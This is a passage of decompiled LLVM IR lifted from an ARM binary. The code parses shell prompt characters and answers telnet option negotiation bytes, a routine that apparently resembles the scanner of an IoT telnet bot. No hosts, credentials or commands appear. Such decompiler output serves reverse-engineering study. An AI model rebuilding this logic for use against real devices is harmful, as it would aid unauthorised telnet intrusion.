  %v2_11400 = icmp eq i32 %v0_11400, 0
  store i1 %v2_11400, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11400, label %dec_label_pc_10c58.loopexit, label %dec_label_pc_10e0c

dec_label_pc_1140c:                               ; preds = %dec_label_pc_10cdc
  %v1_1140c = add i32 %v0_10cdc, 24
  %v2_1140c = inttoptr i32 %v1_1140c to i32*
  %v3_1140c = load i32, i32* %v2_1140c, align 4
  store i32 %v3_1140c, i32* %r1.global-to-local, align 4
  %v1_11410 = add i32 %v3_1140c, -1
  store i32 %v1_11410, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11414 = icmp eq i32 %v1_11410, 0
  store i1 %v2_11414, i1* %cpsr_z.global-to-local, align 1
  %tmp367 = icmp slt i32 %v1_11410, 1
  br i1 %tmp367, label %dec_label_pc_11478, label %dec_label_pc_1141c

dec_label_pc_1141c:                               ; preds = %dec_label_pc_1140c
  %v2_1141c = add i32 %v1_11410, %v0_10cdc
  store i32 %v2_1141c, i32* %r3.global-to-local, align 4
  %v1_11420 = add i32 %v2_1141c, 28
  %v2_11420 = inttoptr i32 %v1_11420 to i8*
  %v3_11420 = load i8, i8* %v2_11420, align 1
  %v4_11420 = zext i8 %v3_11420 to i32
  store i32 %v4_11420, i32* %r3.global-to-local, align 4
  %v2_11424 = icmp ugt i8 %v3_11420, 61
  store i1 %v2_11424, i1* %cpsr_c.global-to-local, align 1
  %v7_11424 = icmp eq i8 %v3_11420, 62
  store i1 %v7_11424, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11424, label %dec_label_pc_11620, label %bb368

bb368:                                            ; preds = %dec_label_pc_1141c
  %v3_11428 = icmp ugt i8 %v3_11420, 57
  store i1 %v3_11428, i1* %cpsr_c.global-to-local, align 1
  %v8_11428 = icmp eq i8 %v3_11420, 58
  store i1 %v8_11428, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_11428, label %dec_label_pc_11620, label %dec_label_pc_11430

dec_label_pc_11430:                               ; preds = %bb368
  %v2_11430 = icmp ugt i8 %v3_11420, 35
  store i1 %v2_11430, i1* %cpsr_c.global-to-local, align 1
  %v7_11430 = icmp eq i8 %v3_11420, 36
  store i1 %v7_11430, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11430, label %dec_label_pc_11620, label %dec_label_pc_11438

dec_label_pc_11438:                               ; preds = %dec_label_pc_11430
  %v2_11438 = icmp ugt i8 %v3_11420, 34
  store i1 %v2_11438, i1* %cpsr_c.global-to-local, align 1
  %v7_11438 = icmp eq i8 %v3_11420, 35
  store i1 %v7_11438, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11438, label %dec_label_pc_11620, label %dec_label_pc_11470.preheader

dec_label_pc_11470.preheader:                     ; preds = %dec_label_pc_11438
  %v3_1143c = add i32 %v0_10cdc, 28
  %v2_11440 = add i32 %v3_1143c, %v3_1140c
  store i32 %v2_11440, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_11470

dec_label_pc_1144c:                               ; preds = %dec_label_pc_11470
  %v1_1144c = add i32 %v0_11468, -2
  %v2_1144c = inttoptr i32 %v1_1144c to i8*
  %v3_1144c = load i8, i8* %v2_1144c, align 1
  %v4_1144c = zext i8 %v3_1144c to i32
  store i32 %v4_1144c, i32* %r2.global-to-local, align 4
  %v2_11450 = icmp ugt i8 %v3_1144c, 61
  store i1 %v2_11450, i1* %cpsr_c.global-to-local, align 1
  %v7_11450 = icmp eq i8 %v3_1144c, 62
  store i1 %v7_11450, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11450, label %dec_label_pc_11620, label %bb369

bb369:                                            ; preds = %dec_label_pc_1144c
  %v3_11454 = icmp ugt i8 %v3_1144c, 57
  store i1 %v3_11454, i1* %cpsr_c.global-to-local, align 1
  %v8_11454 = icmp eq i8 %v3_1144c, 58
  store i1 %v8_11454, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_11454, label %dec_label_pc_11620, label %dec_label_pc_1145c

dec_label_pc_1145c:                               ; preds = %bb369
  %v2_1145c = icmp ugt i8 %v3_1144c, 35
  store i1 %v2_1145c, i1* %cpsr_c.global-to-local, align 1
  %v7_1145c = icmp eq i8 %v3_1144c, 36
  store i1 %v7_1145c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1145c, label %dec_label_pc_11620, label %dec_label_pc_11464

dec_label_pc_11464:                               ; preds = %dec_label_pc_1145c
  %v2_11464 = icmp ugt i8 %v3_1144c, 34
  store i1 %v2_11464, i1* %cpsr_c.global-to-local, align 1
  %v7_11464 = icmp eq i8 %v3_1144c, 35
  store i1 %v7_11464, i1* %cpsr_z.global-to-local, align 1
  %v1_11468 = add i32 %v0_11468, -1
  store i32 %v1_11468, i32* %r3.global-to-local, align 4
  br i1 %v7_11464, label %dec_label_pc_11620, label %dec_label_pc_11470

dec_label_pc_11470:                               ; preds = %dec_label_pc_11470.preheader, %dec_label_pc_11464
  %v0_11468 = phi i32 [ %v2_11440, %dec_label_pc_11470.preheader ], [ %v1_11468, %dec_label_pc_11464 ]
  %v0_11470 = phi i32 [ %v1_11410, %dec_label_pc_11470.preheader ], [ %v1_11470, %dec_label_pc_11464 ]
  %v1_11470 = add i32 %v0_11470, -1
  store i32 %v1_11470, i32* %r0.global-to-local, align 4
  %v2_11470 = icmp ne i32 %v0_11470, 0
  store i1 %v2_11470, i1* %cpsr_c.global-to-local, align 1
  %v7_11470 = icmp eq i32 %v0_11470, 1
  store i1 %v7_11470, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11470, label %dec_label_pc_11478, label %dec_label_pc_1144c

dec_label_pc_11478:                               ; preds = %dec_label_pc_11470, %dec_label_pc_1140c
  %v0_11478 = load i32, i32* @fp, align 4
  store i32 %v0_11478, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_19a64.330 to i32), i32* %r2.global-to-local, align 4
  store i32 7, i32* %r3.global-to-local, align 4
  %v5_11484 = call i32 @function_12428(i32 %v0_11478, i32 %v3_1140c, i32 ptrtoint ([8 x i8]* @global_var_19a64.330 to i32), i32 7)
  store i32 %v5_11484, i32* %r0.global-to-local, align 4
  %v2_11488 = icmp eq i32 %v5_11484, -1
  store i1 %v2_11488, i1* %cpsr_c.global-to-local, align 1
  %v7_11488 = icmp eq i32 %v5_11484, -1
  store i1 %v7_11488, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_11484, i32* @r7, align 4
  br i1 %v7_11488, label %dec_label_pc_10c58.loopexit, label %dec_label_pc_11494

dec_label_pc_11494:                               ; preds = %dec_label_pc_11478
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11494 = icmp eq i32 %v5_11484, 0
  store i1 %v2_11494, i1* %cpsr_z.global-to-local, align 1
  %tmp370 = icmp slt i32 %v5_11484, 1
  br i1 %tmp370, label %dec_label_pc_11400, label %dec_label_pc_11494.dec_label_pc_11624_crit_edge

dec_label_pc_11494.dec_label_pc_11624_crit_edge:  ; preds = %dec_label_pc_11494
  %v0_11624.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_11624

dec_label_pc_114a0:                               ; preds = %dec_label_pc_10cdc
  %v1_114a0 = add i32 %v0_10cdc, 24
  %v2_114a0 = inttoptr i32 %v1_114a0 to i32*
  %v3_114a0 = load i32, i32* %v2_114a0, align 4
  store i32 %v3_114a0, i32* %r2.global-to-local, align 4
  %v0_114a4 = load i32, i32* @fp, align 4
  store i32 %v0_114a4, i32* @r4, align 4
  store i32 0, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_114ac123 = icmp eq i32 %v3_114a0, 0
  store i1 %v9_114ac123, i1* %cpsr_z.global-to-local, align 1
  %v7_114b0124 = icmp sgt i32 %v3_114a0, 0
  br i1 %v7_114b0124, label %dec_label_pc_114b4.preheader, label %dec_label_pc_11560

dec_label_pc_114ac.loopexit:                      ; preds = %dec_label_pc_114d0
  %v2_114d8 = add i32 %v1_114d8, 2
  store i32 %v2_114d8, i32* @r4, align 4
  %v2_114dc = add i32 %v1_114dc, 2
  store i32 %v2_114dc, i32* @r7, align 4
  %v3_114ac = icmp uge i32 %v0_114ac, %v2_114dc
  store i1 %v3_114ac, i1* %cpsr_c.global-to-local, align 1
  %v9_114ac = icmp eq i32 %v0_114ac, %v2_114dc
  store i1 %v9_114ac, i1* %cpsr_z.global-to-local, align 1
  %v7_114b0 = icmp sgt i32 %v0_114ac, %v2_114dc
  br i1 %v7_114b0, label %dec_label_pc_114b4.preheader, label %dec_label_pc_11560

dec_label_pc_114b4.preheader:                     ; preds = %dec_label_pc_114a0, %dec_label_pc_114ac.loopexit
  %v6_11568207 = phi i32 [ %v6_11568208, %dec_label_pc_114ac.loopexit ], [ %v0_10cdc, %dec_label_pc_114a0 ]
  %v1_114dc190 = phi i32 [ %v2_114dc, %dec_label_pc_114ac.loopexit ], [ 0, %dec_label_pc_114a0 ]
  %v1_114c0188 = phi i32 [ %v0_114ac, %dec_label_pc_114ac.loopexit ], [ %v3_114a0, %dec_label_pc_114a0 ]
  %v0_114b4186 = phi i32 [ %v2_114d8, %dec_label_pc_114ac.loopexit ], [ %v0_114a4, %dec_label_pc_114a0 ]
  br label %dec_label_pc_114b4

dec_label_pc_114b4:                               ; preds = %dec_label_pc_114b4.preheader, %dec_label_pc_11544
  %v6_11568208 = phi i32 [ %v6_11568207, %dec_label_pc_114b4.preheader ], [ %v0_1154c, %dec_label_pc_11544 ]
  %v1_114dc = phi i32 [ %v1_114dc190, %dec_label_pc_114b4.preheader ], [ %v1_11550, %dec_label_pc_11544 ]
  %v0_114ac = phi i32 [ %v1_114c0188, %dec_label_pc_114b4.preheader ], [ %v3_1154c, %dec_label_pc_11544 ]
  %v1_114d8 = phi i32 [ %v0_114b4186, %dec_label_pc_114b4.preheader ], [ %v1_11558, %dec_label_pc_11544 ]
  %v1_114b4 = inttoptr i32 %v1_114d8 to i8*
  %v2_114b4 = load i8, i8* %v1_114b4, align 1
  %v3_114b4 = zext i8 %v2_114b4 to i32
  store i32 %v3_114b4, i32* %r3.global-to-local, align 4
  %v2_114b8 = icmp eq i8 %v2_114b4, -1
  store i1 %v2_114b8, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_114b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_114b8, label %dec_label_pc_114c0, label %dec_label_pc_11560

dec_label_pc_114c0:                               ; preds = %dec_label_pc_114b4
  %v0_114c0 = load i32, i32* @fp, align 4
  %v2_114c0 = add i32 %v0_114c0, %v0_114ac
  store i32 %v2_114c0, i32* %r1.global-to-local, align 4
  %v1_114c4 = add i32 %v1_114d8, 1
  store i32 %v1_114c4, i32* @r5, align 4
  %v3_114c8 = icmp uge i32 %v2_114c0, %v1_114c4
  store i1 %v3_114c8, i1* %cpsr_c.global-to-local, align 1
  %v9_114c8 = icmp eq i32 %v2_114c0, %v1_114c4
  store i1 %v9_114c8, i1* %cpsr_z.global-to-local, align 1
  %v2_114cc = xor i1 %v3_114c8, true
  %v3_114cc = or i1 %v9_114c8, %v2_114cc
  br i1 %v3_114cc, label %dec_label_pc_11560, label %dec_label_pc_114d0

dec_label_pc_114d0:                               ; preds = %dec_label_pc_114c0
  %v2_114d0 = inttoptr i32 %v1_114c4 to i8*
  %v3_114d0 = load i8, i8* %v2_114d0, align 1
  %v4_114d0 = zext i8 %v3_114d0 to i32
  store i32 %v4_114d0, i32* @r3, align 4
  %v2_114d4 = icmp eq i8 %v3_114d0, -1
  store i1 %v2_114d4, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_114d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_114d4, label %dec_label_pc_114ac.loopexit, label %dec_label_pc_114e4

dec_label_pc_114e4:                               ; preds = %dec_label_pc_114d0
  %v2_114e4 = icmp ugt i8 %v3_114d0, -4
  store i1 %v2_114e4, i1* %cpsr_c.global-to-local, align 1
  %v7_114e4 = icmp eq i8 %v3_114d0, -3
  store i1 %v7_114e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_114e4, label %dec_label_pc_11570, label %dec_label_pc_114ec

dec_label_pc_114ec:                               ; preds = %dec_label_pc_114e4
  %v1_114ec = add i32 %v1_114d8, 2
  store i32 %v1_114ec, i32* %r3.global-to-local, align 4
  %v3_114f0 = icmp uge i32 %v2_114c0, %v1_114ec
  store i1 %v3_114f0, i1* %cpsr_c.global-to-local, align 1
  %v9_114f0 = icmp eq i32 %v2_114c0, %v1_114ec
  store i1 %v9_114f0, i1* %cpsr_z.global-to-local, align 1
  %v2_114f4 = xor i1 %v3_114f0, true
  %v3_114f4 = or i1 %v9_114f0, %v2_114f4
  br i1 %v3_114f4, label %dec_label_pc_11560, label %dec_label_pc_114f8

dec_label_pc_114f8:                               ; preds = %dec_label_pc_115d4, %bb375, %.thread97, %dec_label_pc_114ec
  %v0_114f8 = load i32, i32* @r5, align 4
  %v1_114f8 = inttoptr i32 %v0_114f8 to i8*
  %v2_114f8 = load i8, i8* %v1_114f8, align 1
  %v3_114f8 = zext i8 %v2_114f8 to i32
  store i32 %v3_114f8, i32* %r3.global-to-local, align 4
  %v2_114fc = icmp ugt i8 %v2_114f8, -4
  store i1 %v2_114fc, i1* %cpsr_c.global-to-local, align 1
  %v7_114fc = icmp eq i8 %v2_114f8, -3
  store i1 %v7_114fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_114fc, label %.thread89, label %dec_label_pc_1150c

.thread89:                                        ; preds = %dec_label_pc_114f8
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v1_114f8, align 1
  %v0_11508.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11508.pr.pr, label %.thread92, label %.thread89.dec_label_pc_1150cthread-pre-split_crit_edge

.thread89.dec_label_pc_1150cthread-pre-split_crit_edge: ; preds = %.thread89
  %v0_1150c.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1150c

dec_label_pc_1150c:                               ; preds = %dec_label_pc_114f8, %.thread89.dec_label_pc_1150cthread-pre-split_crit_edge
  %v0_1150c.pr = phi i32 [ %v0_1150c.pr.pre, %.thread89.dec_label_pc_1150cthread-pre-split_crit_edge ], [ %v3_114f8, %dec_label_pc_114f8 ]
  %v2_1150c = icmp ugt i32 %v0_1150c.pr, 250
  store i1 %v2_1150c, i1* %cpsr_c.global-to-local, align 1
  %v7_1150c = icmp eq i32 %v0_1150c.pr, 251
  store i1 %v7_1150c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1150c, label %bb371, label %.thread92

bb371:                                            ; preds = %dec_label_pc_1150c
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_11514 = load i32, i32* @r5, align 4
  %v4_11514 = inttoptr i32 %v3_11514 to i8*
  store i8 -3, i8* %v4_11514, align 1
  br label %.thread92

.thread92:                                        ; preds = %dec_label_pc_1150c, %.thread89, %bb371
  %v0_11518 = load i32, i32* @r4, align 4
  %v1_11518 = add i32 %v0_11518, 2
  %v2_11518 = inttoptr i32 %v1_11518 to i8*
  %v3_11518 = load i8, i8* %v2_11518, align 1
  %v4_11518 = zext i8 %v3_11518 to i32
  store i32 %v4_11518, i32* %r3.global-to-local, align 4
  %v2_1151c = icmp ugt i8 %v3_11518, -4
  store i1 %v2_1151c, i1* %cpsr_c.global-to-local, align 1
  %v7_1151c = icmp eq i8 %v3_11518, -3
  store i1 %v7_1151c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1151c, label %.thread93, label %dec_label_pc_1152c

.thread93:                                        ; preds = %.thread92
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v2_11518, align 1
  %v0_11528.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11528.pr.pr, label %.thread96, label %.thread93.dec_label_pc_1152cthread-pre-split_crit_edge

.thread93.dec_label_pc_1152cthread-pre-split_crit_edge: ; preds = %.thread93
  %v0_1152c.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1152c

dec_label_pc_1152c:                               ; preds = %.thread92, %.thread93.dec_label_pc_1152cthread-pre-split_crit_edge
  %v0_1152c.pr = phi i32 [ %v0_1152c.pr.pre, %.thread93.dec_label_pc_1152cthread-pre-split_crit_edge ], [ %v4_11518, %.thread92 ]
  %v2_1152c = icmp ugt i32 %v0_1152c.pr, 250
  store i1 %v2_1152c, i1* %cpsr_c.global-to-local, align 1
  %v7_1152c = icmp eq i32 %v0_1152c.pr, 251
  store i1 %v7_1152c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1152c, label %bb372, label %.thread96

bb372:                                            ; preds = %dec_label_pc_1152c
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_11534 = load i32, i32* @r4, align 4
  %v4_11534 = add i32 %v3_11534, 2
  %v5_11534 = inttoptr i32 %v4_11534 to i8*
  store i8 -3, i8* %v5_11534, align 1
  br label %.thread96

.thread96:                                        ; preds = %dec_label_pc_1152c, %.thread93, %bb372
  %v0_11538 = load i32, i32* @r6, align 4
  %v1_11538 = add i32 %v0_11538, 4
  %v2_11538 = inttoptr i32 %v1_11538 to i32*
  %v3_11538 = load i32, i32* %v2_11538, align 4
  store i32 %v3_11538, i32* @r0, align 4
  %v0_1153c = load i32, i32* @r4, align 4
  br label %dec_label_pc_11544

dec_label_pc_11544:                               ; preds = %dec_label_pc_11780, %.thread96
  %v0_11548 = phi i32 [ %v3_11794, %dec_label_pc_11780 ], [ %v3_11538, %.thread96 ]
  %storemerge3 = phi i32 [ %v2_11588, %dec_label_pc_11780 ], [ %v0_1153c, %.thread96 ]
  %storemerge2 = phi i32 [ 9, %dec_label_pc_11780 ], [ 3, %.thread96 ]
  store i32 %storemerge3, i32* @r1, align 4
  store i32 %storemerge2, i32* @r2, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_11548 = call i32 @function_14ac0(i32 %v0_11548, i32 %storemerge3, i32 %storemerge2, i32 16384)
  store i32 %v4_11548, i32* %r0.global-to-local, align 4
  %v0_1154c = load i32, i32* @r6, align 4
  %v1_1154c = add i32 %v0_1154c, 24
  %v2_1154c = inttoptr i32 %v1_1154c to i32*
  %v3_1154c = load i32, i32* %v2_1154c, align 4
  store i32 %v3_1154c, i32* %r2.global-to-local, align 4
  %v0_11550 = load i32, i32* @r7, align 4
  %v1_11550 = add i32 %v0_11550, 3
  store i32 %v1_11550, i32* @r7, align 4
  %v3_11554 = icmp uge i32 %v3_1154c, %v1_11550
  store i1 %v3_11554, i1* %cpsr_c.global-to-local, align 1
  %v9_11554 = icmp eq i32 %v3_1154c, %v1_11550
  store i1 %v9_11554, i1* %cpsr_z.global-to-local, align 1
  %v0_11558 = load i32, i32* @r4, align 4
  %v1_11558 = add i32 %v0_11558, 3
  store i32 %v1_11558, i32* @r4, align 4
  %v8_1155c = icmp sgt i32 %v3_1154c, %v1_11550
  br i1 %v8_1155c, label %dec_label_pc_114b4, label %dec_label_pc_11560

dec_label_pc_11560:                               ; preds = %dec_label_pc_114ac.loopexit, %dec_label_pc_114b4, %dec_label_pc_11544, %dec_label_pc_114ec, %dec_label_pc_114c0, %dec_label_pc_114a0, %dec_label_pc_11570.dec_label_pc_11560.loopexit_crit_edge
  %v6_11568 = phi i32 [ %v0_115a0, %dec_label_pc_11570.dec_label_pc_11560.loopexit_crit_edge ], [ %v0_10cdc, %dec_label_pc_114a0 ], [ %v6_11568208, %dec_label_pc_114b4 ], [ %v0_1154c, %dec_label_pc_11544 ], [ %v6_11568208, %dec_label_pc_114ec ], [ %v6_11568208, %dec_label_pc_114c0 ], [ %v6_11568208, %dec_label_pc_114ac.loopexit ]
  %v0_11560 = phi i32 [ %v0_11560.pre.pre, %dec_label_pc_11570.dec_label_pc_11560.loopexit_crit_edge ], [ 0, %dec_label_pc_114a0 ], [ %v1_114dc, %dec_label_pc_114b4 ], [ %v1_11550, %dec_label_pc_11544 ], [ %v1_114dc, %dec_label_pc_114ec ], [ %v1_114dc, %dec_label_pc_114c0 ], [ %v2_114dc, %dec_label_pc_114ac.loopexit ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11560 = icmp eq i32 %v0_11560, 0
  store i1 %v2_11560, i1* %cpsr_z.global-to-local, align 1
  %tmp373 = icmp slt i32 %v0_11560, 1
  br i1 %tmp373, label %dec_label_pc_11400, label %bb374

bb374:                                            ; preds = %dec_label_pc_11560
  store i32 3, i32* %r0.global-to-local, align 4
  %v7_11568 = add i32 %v6_11568, 12
  %v8_11568 = inttoptr i32 %v7_11568 to i32*
  store i32 3, i32* %v8_11568, align 4
  br label %dec_label_pc_11400

dec_label_pc_11570:                               ; preds = %dec_label_pc_114e4
  store i32 %v2_11574, i32* @r8, align 4
  store i32 ptrtoint (i32* @global_var_19a75.332 to i32), i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 %v2_11574, i32* %r0.global-to-local, align 4
  store i32 %v2_11588, i32* @sl, align 4
  %v4_1158c = call i32 @function_1513c(i16* %v3_1158c, i32 ptrtoint (i32* @global_var_19a75.332 to i32), i32 3)
  store i32 9, i32* %r2.global-to-local, align 4
  store i32 %v2_11588, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_19a6c.334 to i32), i32* %r1.global-to-local, align 4
  %v4_1159c = call i32 @function_1513c(i16* %v3_1159c, i32 ptrtoint (i32* @global_var_19a6c.334 to i32), i32 9)
  store i32 %v4_1159c, i32* %r0.global-to-local, align 4
  %v0_115a0 = load i32, i32* @r6, align 4
  %v1_115a0 = add i32 %v0_115a0, 24
  %v2_115a0 = inttoptr i32 %v1_115a0 to i32*
  %v3_115a0 = load i32, i32* %v2_115a0, align 4
  %v0_115a4 = load i32, i32* @r4, align 4
  %v1_115a4 = add i32 %v0_115a4, 2
  store i32 %v1_115a4, i32* %r2.global-to-local, align 4
  %v0_115a8 = load i32, i32* @fp, align 4
  %v2_115a8 = add i32 %v0_115a8, %v3_115a0
  store i32 %v2_115a8, i32* %r3.global-to-local, align 4
  %v3_115ac = icmp uge i32 %v2_115a8, %v1_115a4
  store i1 %v3_115ac, i1* %cpsr_c.global-to-local, align 1
  %v9_115ac = icmp eq i32 %v2_115a8, %v1_115a4
  store i1 %v9_115ac, i1* %cpsr_z.global-to-local, align 1
  %v2_115b0 = xor i1 %v3_115ac, true
  %v3_115b0 = or i1 %v9_115ac, %v2_115b0
  br i1 %v3_115b0, label %dec_label_pc_11570.dec_label_pc_11560.loopexit_crit_edge, label %dec_label_pc_115b4

dec_label_pc_11570.dec_label_pc_11560.loopexit_crit_edge: ; preds = %dec_label_pc_11570
  %v0_11560.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_11560

dec_label_pc_115b4:                               ; preds = %dec_label_pc_11570
  %v2_115b4 = inttoptr i32 %v1_115a4 to i8*
  %v3_115b4 = load i8, i8* %v2_115b4, align 1
  %v4_115b4 = zext i8 %v3_115b4 to i32
  store i32 %v4_115b4, i32* %r3.global-to-local, align 4
  %v2_115b8 = icmp ugt i8 %v3_115b4, 30
  store i1 %v2_115b8, i1* %cpsr_c.global-to-local, align 1
  %v7_115b8 = icmp eq i8 %v3_115b4, 31
  store i1 %v7_115b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_115b8, label %dec_label_pc_11780, label %dec_label_pc_115c0

dec_label_pc_115c0:                               ; preds = %dec_label_pc_115b4
  %v1_115c0 = inttoptr i32 %v0_115a4 to i8*
  %v2_115c0 = load i8, i8* %v1_115c0, align 1
  %v3_115c0 = zext i8 %v2_115c0 to i32
  store i32 %v3_115c0, i32* %r3.global-to-local, align 4
  %v2_115c4 = icmp ugt i8 %v2_115c0, -4
  store i1 %v2_115c4, i1* %cpsr_c.global-to-local, align 1
  %v7_115c4 = icmp eq i8 %v2_115c0, -3
  store i1 %v7_115c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_115c4, label %.thread97, label %dec_label_pc_115d4

.thread97:                                        ; preds = %dec_label_pc_115c0
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v1_115c0, align 1
  %v0_115d0.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_115d0.pr.pr, label %dec_label_pc_114f8, label %.thread97.dec_label_pc_115d4thread-pre-split_crit_edge

.thread97.dec_label_pc_115d4thread-pre-split_crit_edge: ; preds = %.thread97
  %v0_115d4.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_115d4

dec_label_pc_115d4:                               ; preds = %dec_label_pc_115c0, %.thread97.dec_label_pc_115d4thread-pre-split_crit_edge
  %v0_115d4.pr = phi i32 [ %v0_115d4.pr.pre, %.thread97.dec_label_pc_115d4thread-pre-split_crit_edge ], [ %v3_115c0, %dec_label_pc_115c0 ]
  %v2_115d4 = icmp ugt i32 %v0_115d4.pr, 250
  store i1 %v2_115d4, i1* %cpsr_c.global-to-local, align 1
  %v7_115d4 = icmp eq i32 %v0_115d4.pr, 251
  store i1 %v7_115d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_115d4, label %bb375, label %dec_label_pc_114f8

bb375:                                            ; preds = %dec_label_pc_115d4
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_115dc = load i32, i32* @r4, align 4
  %v4_115dc = inttoptr i32 %v3_115dc to i8*
  store i8 -3, i8* %v4_115dc, align 1
  br label %dec_label_pc_114f8

dec_label_pc_115e4:                               ; preds = %dec_label_pc_113a8, %dec_label_pc_113c8, %dec_label_pc_113c0, %dec_label_pc_113b8, %bb366, %dec_label_pc_11394, %dec_label_pc_11370, %dec_label_pc_1138c, %dec_label_pc_11384, %bb365
  %v0_115e4 = phi i32 [ %v1_11364, %dec_label_pc_11394 ], [ %v1_11364, %dec_label_pc_11370 ], [ %v1_11364, %dec_label_pc_1138c ], [ %v1_11364, %dec_label_pc_11384 ], [ %v1_11364, %bb365 ], [ %v1_113d4, %bb366 ], [ %v1_113d4, %dec_label_pc_113b8 ], [ %v1_113d4, %dec_label_pc_113c0 ], [ %v1_113d4, %dec_label_pc_113c8 ], [ %v1_113d4, %dec_label_pc_113a8 ]
  %v1_115e4 = add i32 %v0_115e4, 1
  store i32 %v1_115e4, i32* @r7, align 4
  br label %dec_label_pc_115e8

dec_label_pc_115e8:                               ; preds = %dec_label_pc_113f8.dec_label_pc_115e8_crit_edge, %dec_label_pc_115e4
  %v0_115e8 = phi i32 [ %v0_115e8.pre, %dec_label_pc_113f8.dec_label_pc_115e8_crit_edge ], [ %v0_10cdc, %dec_label_pc_115e4 ]
  %v1_115e8 = inttoptr i32 %v0_115e8 to i32*
  %v2_115e8 = load i32, i32* %v1_115e8, align 4
  store i32 %v2_115e8, i32* %r3.global-to-local, align 4
  %v1_115ec = add i32 %v0_115e8, 4
  %v2_115ec = inttoptr i32 %v1_115ec to i32*
  %v3_115ec = load i32, i32* %v2_115ec, align 4
  store i32 %v3_115ec, i32* @r0, align 4
  %v1_115f0 = add i32 %v2_115e8, 12
  %v2_115f0 = inttoptr i32 %v1_115f0 to i8*
  %v3_115f0 = load i8, i8* %v2_115f0, align 1
  %v4_115f0 = zext i8 %v3_115f0 to i32
  store i32 %v4_115f0, i32* @r2, align 4
  %v1_115f4 = inttoptr i32 %v2_115e8 to i32*
  %v2_115f4 = load i32, i32* %v1_115f4, align 4
  store i32 %v2_115f4, i32* @r1, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_115fc = call i32 @function_14ac0(i32 %v3_115ec, i32 %v2_115f4, i32 %v4_115f0, i32 16384)
  store i32 %v4_115fc, i32* %r0.global-to-local, align 4
  %v0_11600 = load i32, i32* @r6, align 4
  %v1_11600 = add i32 %v0_11600, 4
  %v2_11600 = inttoptr i32 %v1_11600 to i32*
  %v3_11600 = load i32, i32* %v2_11600, align 4
  store i32 %v3_11600, i32* @r0, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_197c0.32 to i32), i32* @r1, align 4
  store i32 2, i32* @r2, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_11610 = call i32 @function_14ac0(i32 %v3_11600, i32 ptrtoint ([3 x i8]* @global_var_197c0.32 to i32), i32 2, i32 16384)
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_11618 = load i32, i32* @r6, align 4
  %v2_11618 = add i32 %v1_11618, 12
  %v3_11618 = inttoptr i32 %v2_11618 to i32*
  store i32 4, i32* %v3_11618, align 4
  br label %dec_label_pc_11400

dec_label_pc_11620:                               ; preds = %dec_label_pc_1144c, %dec_label_pc_11464, %dec_label_pc_1145c, %bb369, %dec_label_pc_11438, %dec_label_pc_1141c, %dec_label_pc_11430, %bb368
  %v0_11620 = phi i32 [ %v1_11410, %dec_label_pc_11438 ], [ %v1_11410, %dec_label_pc_1141c ], [ %v1_11410, %dec_label_pc_11430 ], [ %v1_11410, %bb368 ], [ %v1_11470, %bb369 ], [ %v1_11470, %dec_label_pc_1145c ], [ %v1_11470, %dec_label_pc_11464 ], [ %v1_11470, %dec_label_pc_1144c ]
  %v1_11620 = add i32 %v0_11620, 1
  store i32 %v1_11620, i32* @r7, align 4
  br label %dec_label_pc_11624

dec_label_pc_11624:                               ; preds = %dec_label_pc_11494.dec_label_pc_11624_crit_edge, %dec_label_pc_11620
  %v0_11624 = phi i32 [ %v0_11624.pre, %dec_label_pc_11494.dec_label_pc_11624_crit_edge ], [ %v0_10cdc, %dec_label_pc_11620 ]
  %v1_11624 = inttoptr i32 %v0_11624 to i32*
  %v2_11624 = load i32, i32* %v1_11624, align 4
  store i32 %v2_11624, i32* %r3.global-to-local, align 4
